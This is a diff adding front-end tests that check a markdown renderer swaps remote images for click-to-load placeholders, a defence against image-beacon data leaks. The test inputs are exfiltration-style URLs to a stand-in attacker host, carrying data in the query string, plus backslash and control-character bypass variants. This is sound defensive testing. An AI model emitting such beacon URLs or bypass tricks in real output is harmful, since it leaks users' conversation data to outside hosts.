@@ -338,3 +338,61 @@ describe('inline code block langtag', () => {
     expect(code!.className).toContain(`language-${langtag}`);
   });
 });
+
+describe('remote images', () => {
+  const remote = 'https://attacker.example/p.png?d=conversation-secret';
+
+  it('renders a remote image as a placeholder that carries no src', () => {
+    const div = parse(`![chart](${remote})`);
+
+    // No <img> at all: the browser makes no request, so the URL cannot beacon.
+    expect(div.querySelector('img')).toBeNull();
+    const placeholder = div.querySelector('button.remote-image-placeholder');
+    expect(placeholder).not.toBeNull();
+    expect(placeholder).toHaveAttribute('data-remote-src', remote);
+    expect(placeholder).toHaveTextContent('attacker.example');
+  });
+
+  it('loads the remote image only after a click', () => {
+    const div = parse(`![chart](${remote})`);
+    div.querySelector<HTMLButtonElement>('button.remote-image-placeholder')!.click();
+
+    const img = div.querySelector('img');
+    expect(img).not.toBeNull();
+    expect(img).toHaveAttribute('src', remote);
+    expect(div.querySelector('.remote-image-placeholder')).toBeNull();
+  });
+
+  it('treats a backslash scheme-relative URL as remote', () => {
+    // Browsers read `\\attacker.example/x.png` as `//attacker.example/x.png`.
+    const div = parse('![chart](\\\\attacker.example/p.png?d=secret)');
+
+    expect(div.querySelector('img')).toBeNull();
+    expect(div.querySelector('button.remote-image-placeholder')).not.toBeNull();
+  });
+
+  it('treats a URL behind a leading control character as remote', () => {
+    // The browser strips it and fetches `//attacker.example/...`.
+    const div = parse('![chart](\x01//attacker.example/p.png?d=secret)');
+
+    expect(div.querySelector('img')).toBeNull();
+    expect(div.querySelector('button.remote-image-placeholder')).not.toBeNull();
+  });
+
+  it('does not follow a surrounding link when the placeholder is clicked', () => {
+    const div = parse(`[![chart](${remote})](https://other.example/page)`);
+    const click = new MouseEvent('click', { bubbles: true, cancelable: true });
+    div.querySelector('button.remote-image-placeholder')!.dispatchEvent(click);
+
+    expect(click.defaultPrevented).toBe(true);
+    expect(div.querySelector('a img')).toHaveAttribute('src', remote);
+  });
+
+  it('renders same-origin images directly', () => {
+    const src = '/api/v2/conversations/abc/files/chart.png';
+    const div = parse(`![chart](${src})`);
+
+    expect(div.querySelector('button.remote-image-placeholder')).toBeNull();
+    expect(div.querySelector('img')).toHaveAttribute('src', src);
+  });
+});
